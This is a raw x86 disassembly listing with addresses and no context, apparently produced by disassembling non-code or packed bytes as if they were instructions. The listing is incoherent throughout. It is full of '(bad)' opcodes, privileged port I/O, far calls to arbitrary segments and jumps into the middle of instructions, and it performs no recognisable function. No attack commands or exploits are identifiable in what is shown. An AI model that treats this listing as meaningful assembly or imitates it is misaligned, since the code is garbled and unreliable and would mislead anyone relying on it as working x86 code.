  419953:	lock and esp,DWORD PTR [ebx]
  419956:	push   ebp
  419957:	leave  
  419958:	mov    WORD PTR [eax-0x248a929e],?
  41995e:	sub    bh,cl
  419960:	jo     0x419986
  419962:	inc    esp
  419963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419964:	or     al,bh
  419966:	repz xor eax,0x38331d75
  41996c:	cmc    
  41996d:	xchg   BYTE PTR [ecx],bl
  41996f:	dec    ebp
  419970:	pop    ebp
  419971:	loope  0x419942
  419973:	(bad)  
  419975:	loope  0x4199c2
  419977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419978:	mov    ebp,0x660083d3
  41997d:	(bad)  
  41997e:	pop    edi
  41997f:	ret    0x2d2
  419982:	pop    ecx
  419983:	popf   
  419984:	mov    ah,0x0
  419986:	stc    
  419987:	xor    DWORD PTR [esi+0x4b74fa29],edi
  41998d:	out    0x29,eax
  41998f:	or     BYTE PTR ds:0xe2328433,dh
  419995:	xor    BYTE PTR [esp+esi*1],bl
  419998:	adc    eax,0x93e0357b
  41999d:	jl     0x419967
  41999f:	cmp    dh,BYTE PTR [edi]
  4199a1:	xor    bl,BYTE PTR [ebp+0x16809251]
  4199a7:	bound  ebp,QWORD PTR [ebp+0x66c3aa6c]
  4199ad:	mov    bl,0x19
  4199af:	(bad)  
  4199b0:	ficom  DWORD PTR [ecx+0x71bc0d81]
  4199b6:	std    
  4199b7:	and    DWORD PTR [edx],esi
  4199b9:	mov    bl,0xc3
  4199bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199bc:	add    BYTE PTR [edx],0xda
  4199bf:	pop    esi
  4199c0:	push   esi
  4199c1:	pop    ebx
  4199c2:	and    DWORD PTR [esi+0x7d],edi
  4199c5:	add    BYTE PTR [eax-0x76cfb69a],ah
  4199cb:	retf   0x7fc5
  4199ce:	ret    0x7329
  4199d1:	or     cl,BYTE PTR [ebx]
  4199d3:	sub    DWORD PTR [ebx],ecx
  4199d5:	rcr    ecx,0x86
  4199d8:	arpl   cx,di
  4199da:	icebp  
  4199db:	pusha  
  4199dc:	frstor [edx+ebp*8+0x3c]
  4199e0:	fwait
  4199e1:	sub    DWORD PTR [edx+0x1e58d51d],0x63
  4199e8:	dec    ebx
  4199e9:	loop   0x419a0e
  4199eb:	icebp  
  4199ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199ed:	out    dx,al
  4199ee:	imul   ebx,DWORD PTR [esp+ebp*4+0x73],0x24
  4199f3:	mov    dl,0x66
  4199f5:	sub    al,0x69
  4199f7:	aam    0xe7
  4199f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199fa:	jmp    0x98149e5e
  4199ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a00:	pop    ss
  419a01:	(bad)  [ebp+0x3d37f87]
  419a07:	sub    BYTE PTR [eiz*4+0x6400e402],al
  419a0e:	ficom  WORD PTR [ecx+eiz*2+0x5b9e05ff]
  419a15:	dec    ebx
  419a16:	pop    ebp
  419a17:	pushf  
  419a18:	clc    
  419a19:	je     0x419a13
  419a1b:	inc    esi
  419a1c:	in     eax,dx
  419a1d:	ins    BYTE PTR es:[edi],dx
  419a1e:	push   ds
  419a1f:	cli    
  419a20:	ins    BYTE PTR es:[edi],dx
  419a21:	iret   
  419a22:	adc    DWORD PTR [edx-0x624d23fa],ecx
  419a28:	push   ss
  419a29:	lds    edi,FWORD PTR [edi]
  419a2b:	ins    BYTE PTR es:[edi],dx
  419a2c:	test   DWORD PTR [eax-0x40],ebx
  419a2f:	jp     0x4199e7
  419a31:	xor    bl,bl
  419a33:	test   al,0x6f
  419a35:	xchg   DWORD PTR [esi+0x4c],edi
  419a38:	(bad)  ds:0xc204395
  419a3e:	jb     0x419a58
  419a40:	popa   
  419a41:	dec    esi
  419a42:	sub    BYTE PTR [edx+0x21001f5a],dh
  419a48:	dec    ebp
  419a49:	stos   DWORD PTR es:[edi],eax
  419a4a:	xchg   edx,eax
  419a4b:	sbb    ebp,edx
  419a4d:	out    dx,al
  419a4e:	mov    ecx,0x5f86bc08
  419a53:	iret   
  419a54:	add    DWORD PTR [ecx+ecx*4-0x74118984],edi
  419a5b:	dec    esp
  419a5c:	add    BYTE PTR [esi+0x2e],bh
  419a5f:	pop    eax
  419a60:	test   eax,0x309ff437
  419a65:	sahf   
  419a66:	loope  0x419a84
  419a68:	jns    0x419a12
  419a6a:	(bad)  
  419a6b:	lahf   
  419a6c:	stos   DWORD PTR es:[edi],eax
  419a6d:	scas   al,BYTE PTR es:[edi]
  419a6e:	fisub  WORD PTR [edx]
  419a70:	shl    DWORD PTR ds:0x9bf4ee80,cl
  419a76:	inc    ebx
  419a77:	xchg   esi,eax
  419a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a79:	xchg   ebp,eax
  419a7a:	inc    eax
  419a7b:	retf   
  419a7c:	pop    edx
  419a7d:	cmc    
  419a7e:	or     BYTE PTR [ebx],bl
  419a80:	int3   
  419a81:	cmp    DWORD PTR [ebx-0x55],esp
  419a84:	(bad)  
  419a85:	jg     0x419b00
  419a87:	sub    bl,cl
  419a89:	imul   eax,eax,0xf
  419a8c:	push   0xffffffb0
  419a8e:	shl    BYTE PTR [edx],0x1d
  419a91:	cmp    ebp,ecx
  419a93:	rol    BYTE PTR [ecx*2-0x756af013],0x92
  419a9b:	aaa    
  419a9c:	stos   BYTE PTR es:[edi],al
  419a9d:	mov    BYTE PTR [ebp+0x187655e4],dl
  419aa3:	and    esp,edx
  419aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419aa6:	cli    
  419aa7:	or     dl,0x29
  419aaa:	icebp  
  419aab:	lahf   
  419aac:	outs   dx,BYTE PTR ds:[esi]
  419aad:	push   ebx
  419aae:	call   0xdb62:0x6667b8e3
  419ab5:	push   0x77
  419ab7:	mov    bh,0xc3
  419ab9:	(bad)  
  419aba:	or     ebx,DWORD PTR [ebp-0x71adc5e5]
  419ac0:	mov    edx,0x68d2d470
  419ac5:	bound  ebp,QWORD PTR [eax]
  419ac7:	outs   dx,DWORD PTR ds:[esi]
  419ac8:	into   
  419ac9:	scas   eax,DWORD PTR es:[edi]
  419aca:	mov    al,ds:0x6bdf6a97
  419acf:	pop    ds
  419ad0:	ss push edx
  419ad2:	aaa    
  419ad3:	arpl   WORD PTR [esi+0x40],si
  419ad6:	mov    eax,eax
  419ad8:	aas    
  419ad9:	and    cl,BYTE PTR [eax+ecx*8+0x76]
  419add:	jecxz  0x419af3
  419adf:	imul   ebp,DWORD PTR [eax+edi*4+0xe],0xd32a1b3
  419ae7:	add    eax,0xdeff9d82
  419aec:	mov    bh,0x7c
  419aee:	xor    BYTE PTR [ebp-0x14],dl
  419af1:	mov    esp,0xde11a93e
  419af6:	out    0xc9,al
  419af8:	xor    ebp,0xdaeb5481
  419afe:	imul   ebx,DWORD PTR [esi],0x2d75cf99
  419b04:	ret    
  419b05:	jecxz  0x419aad
  419b07:	cmp    edx,DWORD PTR [ebx]
  419b09:	out    0xe9,eax
  419b0b:	int3   
  419b0c:	idiv   DWORD PTR [eax]
  419b0e:	sti    
  419b0f:	lea    esp,[esi+0x6c]
  419b12:	sahf   
  419b13:	scas   al,BYTE PTR es:[edi]
  419b14:	hlt    
  419b15:	sub    cl,BYTE PTR [ecx]
  419b17:	pop    ds
  419b18:	dec    esp
  419b19:	pushf  
  419b1a:	sahf   
  419b1b:	out    dx,eax
  419b1c:	addr16 dec ebp
  419b1e:	pop    esi
  419b1f:	fsubr  QWORD PTR [ebp-0x66]
  419b22:	repz mov ?,ebp
  419b25:	xchg   DWORD PTR [esi+0x4dc2562b],esp
  419b2b:	out    dx,al
  419b2c:	into   
  419b2d:	rcl    BYTE PTR [ebp+0x62e798cf],0x2c
  419b34:	or     ch,dl
  419b36:	fsub   QWORD PTR [edi+edx*8+0x54]
  419b3a:	inc    ebp
  419b3b:	jo     0x419b75
  419b3d:	mov    al,0xc9
  419b3f:	retf   
  419b40:	jmp    0x419b5e
  419b42:	nop
  419b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b44:	sbb    edi,DWORD PTR [esi+0x7d]
  419b47:	lahf   
  419b48:	adc    eax,0xe4075ee9
  419b4d:	das    
  419b4e:	xor    al,0xc8
  419b50:	mul    DWORD PTR [ebx]
  419b52:	outs   dx,BYTE PTR ds:[esi]
  419b53:	xor    bh,BYTE PTR [ecx+0x54]
  419b56:	pop    es
  419b57:	xchg   DWORD PTR [esi-0x12bad2df],esi
  419b5d:	jne    0x419b73
  419b5f:	lods   al,BYTE PTR ds:[esi]
  419b60:	adc    BYTE PTR [edi+0x2e26ab49],al
  419b66:	add    bl,BYTE PTR [ecx]
  419b68:	ins    DWORD PTR es:[edi],dx
  419b69:	test   ch,al
  419b6b:	xchg   esi,eax
  419b6c:	call   0x43a6886e
  419b71:	scas   eax,DWORD PTR es:[edi]
  419b72:	ficomp WORD PTR [edx-0x462fb290]
  419b78:	popf   
  419b79:	xor    esi,DWORD PTR [edi]
  419b7b:	bsf    eax,DWORD PTR [edi-0x55]
  419b7f:	inc    eax
  419b80:	push   ds
  419b81:	ror    dl,1
  419b83:	es adc al,0x7b
  419b86:	mov    ecx,0xb82e6ec3
  419b8b:	pop    ss
  419b8c:	mov    cl,0xad
  419b8e:	sub    ebp,ebx
  419b90:	aas    
  419b91:	out    dx,al
  419b92:	daa    
  419b93:	sbb    BYTE PTR [ebp-0x6f8c994d],cl
  419b99:	or     BYTE PTR [ebx-0x2f],0x5b
  419b9d:	dec    ecx
  419b9e:	mov    ?,WORD PTR [eax]
  419ba0:	or     esp,eax
  419ba2:	cmp    ecx,esp
  419ba4:	rcl    DWORD PTR [ebp+0x6dcc2e9b],0x8e
  419bab:	out    dx,al
  419bac:	sbb    eax,0x2bcab449
  419bb1:	(bad)  
  419bb2:	mov    ch,0x44
  419bb4:	lods   eax,DWORD PTR ds:[esi]
  419bb5:	jg     0x419b59
  419bb7:	add    DWORD PTR [edi],0xffffff89
  419bba:	fs in  al,dx
  419bbc:	dec    ecx
  419bbd:	sbb    DWORD PTR [ebp-0x19],edi
  419bc0:	jno    0x419bfe
  419bc2:	fld    st(5)
  419bc4:	lds    edi,FWORD PTR [ecx+0x63]
  419bc7:	pushf  
  419bc8:	mov    ebp,0x5b95a741
  419bcd:	cmp    al,0x58
  419bcf:	adc    eax,edx
  419bd1:	fist   WORD PTR [edi+0x6725d818]
  419bd7:	sub    BYTE PTR [ecx-0x2813948],cl
  419bdd:	call   0x91dd:0xcedd42f4
  419be4:	fucomip st,st(6)
  419be6:	mov    bl,BYTE PTR [esi]
  419be8:	loope  0x419b9b
  419bea:	test   DWORD PTR [ecx+ebp*8-0x7dfce8c1],edx
  419bf1:	test   ch,cl
  419bf3:	push   ds
  419bf4:	cdq    
  419bf5:	dec    ebp
  419bf6:	aaa    
  419bf7:	xchg   edx,eax
  419bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bf9:	sub    cl,BYTE PTR [edi+0x64]
  419bfc:	inc    ebp
  419bfd:	sub    BYTE PTR [eax],cl
  419bff:	jg     0x419ba5
  419c01:	adc    dl,BYTE PTR [ecx*1+0x1b371f4]
  419c08:	daa    
  419c09:	loopne 0x419bcf
  419c0b:	aas    
  419c0c:	jnp    0x419be8
  419c0e:	in     eax,0x77
  419c10:	sti    
  419c11:	iret   
  419c12:	stos   DWORD PTR es:[edi],eax
  419c13:	pop    esi
  419c14:	push   0x47
  419c16:	or     BYTE PTR [esi-0x249a6a22],al
  419c1c:	cs loop 0x419bdf
  419c1f:	adc    ecx,eax
  419c21:	and    al,0x90
  419c23:	inc    ebp
  419c24:	es cli 
  419c26:	stos   DWORD PTR es:[edi],eax
  419c27:	lock add al,0xda
  419c2a:	push   ebp
  419c2b:	iret   
  419c2c:	adc    DWORD PTR [ecx+0x5d062977],ebp
  419c32:	loopne 0x419c75
  419c34:	lods   eax,DWORD PTR ds:[esi]
  419c35:	leave  
  419c36:	retf   
  419c37:	out    dx,eax
  419c38:	fs inc ebx
  419c3a:	daa    
  419c3b:	mov    bl,0xa0
  419c3d:	push   0xf
  419c3f:	aaa    
  419c40:	jge    0x419be2
  419c42:	arpl   WORD PTR [edi],ax
  419c44:	mov    al,ds:0x16924753
  419c49:	mov    DWORD PTR [ebx-0x36],0x79e8e18c
  419c50:	and    eax,0xe960ec51
  419c55:	dec    ebx
  419c56:	nop
  419c57:	imul   ecx,DWORD PTR [esi+edi*4-0x5f843ca],0x65c7c3aa
  419c62:	adc    dh,BYTE PTR [edi]
  419c64:	pushf  
  419c65:	jno    0x419c2f
  419c67:	cs aaa 
  419c69:	fstp   DWORD PTR [ecx]
  419c6b:	sub    DWORD PTR [esi-0x4a],ecx
  419c6e:	jne    0x419c86
  419c70:	mov    ch,0x42
  419c72:	call   0x36751546
  419c77:	sbb    BYTE PTR [eax],al
  419c79:	into   
  419c7a:	in     al,dx
  419c7b:	push   edx
  419c7c:	in     al,0xb7
  419c7e:	icebp  
  419c7f:	ja     0x419c64
  419c81:	into   
  419c82:	stos   BYTE PTR es:[edi],al
  419c83:	clc    
  419c84:	pop    edx
  419c85:	outs   dx,BYTE PTR ds:[esi]
  419c86:	fcompp 
  419c88:	stos   DWORD PTR es:[edi],eax
  419c89:	and    dl,bh
  419c8b:	aas    
  419c8c:	call   0x55c738ca
  419c91:	sbb    ebx,DWORD PTR [edx-0x1ed18bde]
  419c97:	outs   dx,DWORD PTR ds:[esi]
  419c98:	sub    BYTE PTR [edi-0x1771a307],0xd5
  419c9f:	mov    ds:0x7fe90e9e,eax
  419ca4:	rol    edx,cl
  419ca6:	and    esi,DWORD PTR [esi-0x24e5080e]
  419cac:	inc    ecx
  419cad:	push   cs
  419cae:	push   edi
  419caf:	jbe    0x419c7d
  419cb1:	sbb    DWORD PTR ds:0xfc635a33,edi
  419cb7:	add    DWORD PTR [esi+0x52],ecx
  419cba:	push   esp
  419cbb:	jge    0x419c56
  419cbd:	fcmovbe st,st(3)
  419cbf:	xor    dh,dh
  419cc1:	add    eax,0x83a42bc3
  419cc6:	aaa    
  419cc7:	je     0x419cb7
  419cc9:	jmp    FWORD PTR [esi+edx*1+0x240313dd]
  419cd0:	int    0x75
  419cd2:	pop    esp
  419cd3:	jmp    0xa223b341
  419cd8:	mov    ch,0xb3
  419cda:	aaa    
  419cdb:	cmp    BYTE PTR [edx-0x132a59ba],bl
  419ce1:	fisttp WORD PTR [esi+0x738d6efe]
  419ce7:	xor    BYTE PTR [esi],dl
  419ce9:	xchg   ebp,eax
  419cea:	call   0x8dc166b7
  419cef:	test   BYTE PTR [edx-0x35],ch
  419cf2:	or     ch,cl
  419cf4:	sub    dh,dl
  419cf6:	paddq  mm4,QWORD PTR [esi+ebx*2]
  419cfa:	sub    BYTE PTR [ebp+esi*8-0x1a30ec4a],al
  419d01:	sbb    eax,0x25c0d77c
  419d06:	adc    DWORD PTR [eax+0x45878128],0x8407
  419d10:	add    BYTE PTR [eax],al
  419d12:	mov    BYTE PTR [ebp-0x40],al
  419d15:	fs int 0xe5
  419d18:	lods   al,BYTE PTR ds:[esi]
  419d19:	in     eax,dx
  419d1a:	or     dh,BYTE PTR [ebp-0x5fb0f884]
  419d20:	sub    al,0xc2
  419d22:	rcr    DWORD PTR [ecx],1
  419d24:	add    DWORD PTR [eax],eax
  419d26:	hlt    
  419d27:	add    al,0x0
  419d29:	add    BYTE PTR [esp+ebp*2+0x77],al
  419d2d:	clc    
  419d2e:	imul   edx,edi,0x45
  419d31:	push   edi
  419d32:	xor    eax,0xee0bda2d
  419d37:	or     cl,BYTE PTR [ebp+0x77]
  419d3a:	lods   eax,DWORD PTR ds:[esi]
  419d3c:	dec    esi
  419d3d:	sub    ah,cl
  419d3f:	xchg   ecx,eax
  419d40:	adc    al,0xdc
  419d42:	jno    0x419d4b
  419d44:	sti    
  419d45:	xchg   ecx,eax
  419d46:	ret    
  419d47:	pop    ds
  419d48:	aaa    
  419d49:	dec    ebp
  419d4a:	push   cs
  419d4b:	pop    edi
  419d4c:	cmp    eax,0x9c7a4e33
  419d51:	das    
  419d52:	mov    bl,0x6a
  419d54:	xor    eax,0xb823c05e
  419d59:	xor    ecx,DWORD PTR [ecx+0x22a4cd8]
  419d5f:	xor    bh,al
  419d61:	hlt    
  419d62:	pop    ss
  419d63:	xor    ah,BYTE PTR ds:[esi-0x12737471]
  419d6a:	je     0x419d94
  419d6c:	xor    bl,BYTE PTR [esi]
  419d6e:	cmp    dl,BYTE PTR [esi+0x49]
  419d71:	ins    BYTE PTR es:[edi],dx
  419d72:	inc    esi
  419d73:	mov    ebx,0x3e8b11ce
  419d78:	dec    esp
  419d79:	in     al,0x1e
  419d7b:	in     eax,dx
  419d7c:	test   BYTE PTR ds:0x12dd36a3,dl
  419d82:	test   BYTE PTR [ecx],ah
  419d84:	mov    ds:0xb974996f,eax
  419d89:	adc    eax,0xdc7645d0
  419d8e:	sti    
  419d8f:	and    dl,dl
  419d91:	lds    eax,FWORD PTR [ecx+0x2c]
  419d94:	inc    edx
  419d95:	gs dec esp
  419d97:	inc    ebx
  419d98:	add    DWORD PTR [esi-0x7607ac4d],ecx
  419d9e:	mov    ds:0x9fb36a43,eax
  419da3:	(bad)  
  419da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419da5:	cmp    DWORD PTR [ebp+0x6304fea0],edi
  419dab:	pop    esi
  419dac:	mov    DWORD PTR [esi],esi
  419dae:	jno    0x419d3f
  419db0:	mov    ebx,DWORD PTR [esp+ecx*8-0x27bfc8b]
  419db7:	xor    BYTE PTR [edx-0x7e],al
  419dba:	leave  
  419dbb:	pusha  
  419dbc:	(bad)  
  419dbe:	add    dh,BYTE PTR [esi-0x3de8e380]
  419dc4:	fs xor eax,0x100b73e4
  419dca:	popf   
  419dcb:	adc    ah,BYTE PTR [ebx+0x59]
  419dce:	inc    ebx
  419dcf:	addr16 push ecx
  419dd1:	out    dx,al
  419dd2:	jnp    0x419dfa
  419dd4:	push   esi
  419dd5:	(bad)  
  419dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dd7:	ds jle 0x419da0
  419dda:	jns    0x419d6b
  419ddc:	mov    dl,0xf7
  419dde:	dec    BYTE PTR [edi]
  419de0:	mov    ds:0xaac6ddf2,al
  419de5:	stos   DWORD PTR es:[edi],eax
  419de6:	pop    eax
  419de7:	push   esp
  419de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419de9:	xchg   ecx,eax
  419dea:	mov    BYTE PTR [eax],0x52
  419ded:	adc    DWORD PTR [eax+eiz*4],edi
  419df0:	lahf   
  419df1:	sub    BYTE PTR [ebp-0x2c],cl
  419df4:	es ret 0xfd5b
  419df8:	push   ss
  419df9:	in     al,0x25
  419dfb:	imul   esi,ebx,0xffffffe0
  419dfe:	jno    0x419e03
  419e00:	es aas 
  419e02:	lea    edx,[ecx-0x66]
  419e05:	cdq    
  419e06:	xor    edi,DWORD PTR [ecx+0x75af07b2]
  419e0c:	gs mov esp,0x8afb093e
  419e12:	xor    dh,bh
  419e14:	test   eax,0x6e43e99
  419e19:	das    
  419e1a:	fisub  WORD PTR [esi-0x13]
  419e1d:	in     eax,dx
  419e1e:	stos   BYTE PTR es:[edi],al
  419e1f:	out    0xd8,al
  419e21:	repnz mov ecx,DWORD PTR cs:[esi-0x38d399a0]
  419e29:	mov    eax,0x163135b8
  419e2e:	adc    BYTE PTR [ebp+0x55a0325f],ah
  419e34:	dec    edx
  419e35:	inc    edi
  419e36:	jb     0x419df7
  419e38:	fnstenv [ebx-0x5a]
  419e3b:	icebp  
  419e3c:	dec    eax
  419e3d:	rcl    ah,0x6
  419e40:	cmp    eax,DWORD PTR [edx+0x427c2bc8]
  419e46:	mov    al,ds:0x60a59982
  419e4b:	scas   eax,DWORD PTR es:[edi]
  419e4c:	fcom   QWORD PTR [eax]
  419e4e:	xchg   ecx,eax
  419e4f:	mov    ds:0xe4ee722,eax
  419e54:	pop    esp
  419e55:	dec    esi
  419e56:	repnz out 0xc1,eax
  419e59:	hlt    
  419e5a:	cpuid  
  419e5c:	adc    ebx,0x2b
  419e5f:	mov    bl,dh
  419e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e62:	mov    bl,BYTE PTR gs:[ebx+0xa72eda2]
  419e69:	clc    
  419e6a:	mov    al,ds:0x94664d59
  419e6f:	cmp    al,BYTE PTR [ecx+ebp*1]
  419e72:	pop    ss
  419e73:	inc    bl
  419e75:	in     eax,0xff
  419e77:	and    ch,BYTE PTR [ebp-0x5afd77b0]
  419e7d:	les    esp,FWORD PTR [edi]
  419e7f:	out    0xff,al
  419e81:	test   BYTE PTR [ebp+0x55],cl
  419e84:	in     eax,dx
  419e85:	jbe    0x419e3f
  419e87:	dec    ecx
  419e88:	pop    ebp
  419e89:	xchg   edx,eax
  419e8a:	popa   
  419e8b:	jl     0x419e9b
  419e8d:	and    bh,BYTE PTR [ecx]
  419e8f:	cld    
  419e90:	xchg   ecx,eax
  419e91:	sub    BYTE PTR ds:0x10e4befd,ch
  419e97:	rol    DWORD PTR [edi+edx*8-0x5c6db43f],1
  419e9e:	sbb    eax,0x3a076d9f
  419ea3:	iret   
  419ea4:	lea    edi,[edi+eiz*4-0x5c]
  419ea8:	xchg   edi,eax
  419ea9:	ss addr16 aas 
  419eac:	jmp    0xac5e:0x22c36aa7
  419eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eb4:	repnz in al,0x76
  419eb7:	sbb    al,0xef
  419eb9:	aad    0xbc
  419ebb:	(bad)  
  419ebc:	mov    esp,0xa6d292f7
  419ec1:	outs   dx,DWORD PTR ds:[esi]
  419ec2:	add    ah,al
  419ec4:	test   DWORD PTR [ebx+0x162bd7a9],esi
  419eca:	cmp    bl,BYTE PTR [eax]
  419ecc:	aas    
  419ecd:	sub    edi,DWORD PTR [ecx+esi*8-0x5d]
  419ed1:	aad    0x48
  419ed3:	cdq    
  419ed4:	sbb    DWORD PTR [esi+0x46],esi
  419ed7:	jnp    0x419f4a
  419ed9:	popf   
  419eda:	sub    esp,DWORD PTR [edi+eax*1-0x80]
  419ede:	(bad)  
  419edf:	aad    0x4d
  419ee1:	fs push esp
  419ee3:	jo     0x419f36
  419ee5:	sbb    al,0x78
  419ee7:	arpl   cx,di
  419ee9:	into   
  419eea:	inc    edi
  419eeb:	lods   al,BYTE PTR ds:[esi]
  419eec:	int    0x4b
  419eee:	inc    ebx
  419eef:	mov    ah,0xbc
  419ef1:	fisttp QWORD PTR [esi+0x45f5daf9]
  419ef7:	add    ch,al
  419ef9:	sub    DWORD PTR [eax-0x796857a],esp
  419eff:	mov    ah,0x7b
  419f01:	fidiv  WORD PTR [ecx+edx*4+0x636f2614]
  419f08:	lock (bad) 
  419f0a:	ficomp WORD PTR [ebp+0x7d]
  419f0d:	fisubr DWORD PTR ds:0xefdd745c
  419f13:	gs or  DWORD PTR fs:0x7d90feb4,esi
  419f1b:	inc    esi
  419f1c:	xchg   edx,eax
  419f1d:	(bad)  
  419f1e:	aam    0xff
  419f20:	sbb    DWORD PTR [edx+esi*2],edx
  419f23:	fild   DWORD PTR [edi-0x72]
  419f26:	cmp    BYTE PTR [edi+0x6e],bl
  419f29:	push   edx
  419f2a:	push   ebx
  419f2b:	aas    
  419f2c:	and    edi,edi
  419f2e:	test   eax,0xc28aba08
  419f33:	mov    esp,0x8f975013
  419f38:	mov    eax,ds:0xa3defda1
  419f3d:	dec    ebp
  419f3e:	or     ecx,ecx
  419f40:	scas   al,BYTE PTR es:[edi]
  419f41:	sbb    dl,BYTE PTR [edx-0x5fb84472]
  419f47:	imul   ecx,DWORD PTR ds:0x1ba9ad4,0xd8917de8
  419f51:	xor    dl,BYTE PTR [esi+0xa9c78df]
  419f57:	stos   DWORD PTR es:[edi],eax
  419f58:	or     al,0x28
  419f5a:	push   0xffffff91
  419f5c:	xor    ch,bl
  419f5e:	push   ds
  419f5f:	sbb    BYTE PTR [ebp-0x267f2fa2],al
  419f65:	iret   
  419f66:	jecxz  0x419f25
  419f68:	cmc    
  419f69:	test   eax,0x559e4412
  419f6e:	aad    0x72
  419f70:	test   al,0xe6
  419f72:	je     0x419fdd
  419f74:	ins    DWORD PTR es:[edi],dx
  419f75:	xchg   esp,eax
  419f76:	fs popf 
  419f78:	fwait
  419f79:	test   BYTE PTR [ebx*2+0x5becfd48],bh
  419f80:	lods   al,BYTE PTR ds:[esi]
  419f81:	push   ecx
  419f82:	bound  eax,QWORD PTR [ecx+0x41aa0406]
  419f88:	push   ebx
  419f89:	sub    BYTE PTR [edx],bl
  419f8b:	sub    eax,0x9b9e9ec8
  419f90:	retf   
  419f91:	dec    esi
  419f92:	fiadd  WORD PTR [edx-0x61]
  419f95:	xor    DWORD PTR [ecx-0x8227fe5],edi
  419f9b:	cli    
  419f9c:	repnz inc esp
  419f9e:	popf   
  419f9f:	aas    
  419fa0:	xor    bh,bl
  419fa2:	popa   
  419fa3:	jns    0xe261d385
  419fa9:	jmp    0x419fe5
  419fab:	aas    
  419fac:	jecxz  0x419f4a
  419fae:	sub    esi,DWORD PTR [ebp-0x3]
  419fb1:	pop    ebp
  419fb2:	push   0x46
  419fb4:	out    0xd7,eax
  419fb6:	jne    0x41a020
  419fb8:	into   
  419fb9:	mov    al,0xff
  419fbb:	sub    edx,ebp
  419fbd:	(bad)  
  419fbf:	test   eax,0x3e20213
  419fc4:	dec    ecx
  419fc5:	(bad)  
  419fc6:	in     eax,dx
  419fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc8:	call   0x2221:0xb58ffdeb
  419fcf:	sbb    esi,DWORD PTR [esi-0x66]
  419fd2:	loopne 0x41a026
  419fd4:	sub    al,0x3
  419fd6:	pushf  
  419fd7:	ja     0x419fef
  419fd9:	add    DWORD PTR [ebp+0x54],esp
  419fdc:	jb     0x419f78
  419fde:	and    BYTE PTR [edi-0x7c],dh
  419fe1:	(bad)  
  419fe2:	jmp    0xd73df124
  419fe7:	dec    ebx
  419fe8:	or     BYTE PTR [edi+ecx*8-0x22],al
  419fec:	imul   esp,ebx,0xaa22c3e6
  419ff2:	add    al,0x9f
  419ff4:	pushf  
  419ff5:	ret    
  419ff6:	into   
  419ff7:	adc    cl,ch
  419ff9:	cs jg  0x41a00f
  419ffc:	xor    ch,BYTE PTR [edx]
  419ffe:	sub    DWORD PTR [ebp+0x70],0x95a541ad
  41a005:	loop   0x419fa1
  41a007:	xlat   BYTE PTR ds:[ebx]
  41a008:	cs pusha 
  41a00a:	sbb    ebp,ebx
  41a00c:	mov    ds:0x215e15e1,al
  41a011:	imul   esp,DWORD PTR [ecx-0x3a5f800b],0x901966e5
  41a01b:	and    ch,BYTE PTR [edx]
  41a01d:	xchg   ebx,eax
  41a01e:	add    BYTE PTR [eax-0x58],dh
  41a021:	js     0x419fdc
  41a023:	mov    ds:0x8684c8a1,eax
  41a028:	push   eax
  41a029:	ret    0x288c
  41a02c:	loope  0x41a011
  41a02e:	inc    esp
  41a02f:	jo     0x41a077
  41a031:	sbb    BYTE PTR ds:0x3e788ed6,ah
  41a037:	rol    DWORD PTR [edi+ecx*2-0x3febb8de],0x5
  41a03f:	dec    edi
  41a040:	mov    ebp,0x5a44d27
  41a045:	dec    eax
  41a046:	mov    edx,0x19ba5a4a
  41a04b:	fsubrp st(5),st
  41a04d:	push   es
  41a04e:	push   0xffffff9f
  41a050:	cmp    esi,ecx
  41a052:	loope  0x41a0a1
  41a054:	xchg   esi,eax
  41a055:	and    al,0xd6
  41a057:	jl     0x41a0c2
  41a059:	xor    al,0xdc
  41a05b:	and    DWORD PTR [esi-0x5e64dfe7],ecx
  41a061:	nop
  41a062:	adc    ebp,DWORD PTR [ebx+0x1867f5e0]
  41a068:	xor    eax,0x4eedc81
  41a06d:	push   edi
  41a06e:	mov    ds:0x29b013e,eax
  41a073:	data16 mov al,0x36
  41a076:	dec    eax
  41a077:	pop    eax
  41a078:	mov    esp,0x3fe9a2d3
  41a07d:	pop    esp
  41a07e:	gs jae 0x41a043
  41a081:	push   ebp
  41a082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a083:	jne    0x41a01e
  41a085:	repnz into 
  41a087:	in     al,dx
  41a088:	mov    eax,ds:0xba5ff2e8
  41a08d:	arpl   WORD PTR [ecx+0x1c],dx
  41a090:	jbe    0x41a094
  41a092:	lods   al,BYTE PTR ds:[esi]
  41a093:	xchg   ebp,eax
  41a094:	inc    esp
  41a095:	icebp  
  41a096:	addr16 (bad) 
  41a098:	push   ebx
  41a099:	int    0x9a
  41a09b:	fild   QWORD PTR [ebp+0x17]
  41a09e:	cli    
  41a09f:	jae    0x41a0d3
  41a0a1:	push   ss
  41a0a2:	dec    eax
  41a0a3:	cmp    bl,ch
  41a0a5:	loop   0x41a0c0
  41a0a7:	out    0x62,eax
  41a0a9:	adc    edi,DWORD PTR [edx-0x38]
  41a0ac:	daa    
  41a0ad:	pop    ebp
  41a0ae:	cli    
  41a0af:	inc    ebx
  41a0b0:	stos   BYTE PTR es:[edi],al
  41a0b1:	mov    WORD PTR [ecx],gs
  41a0b3:	inc    esp
  41a0b4:	or     DWORD PTR [esi],eax
  41a0b6:	xor    ecx,ecx
  41a0b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b9:	fadd   QWORD PTR [eax+0x3e]
  41a0bc:	push   0xffffffb9
  41a0be:	in     eax,dx
  41a0bf:	mov    gs,ebp
  41a0c1:	test   DWORD PTR [edi+0x71],edx
  41a0c4:	popa   
  41a0c5:	pop    esi
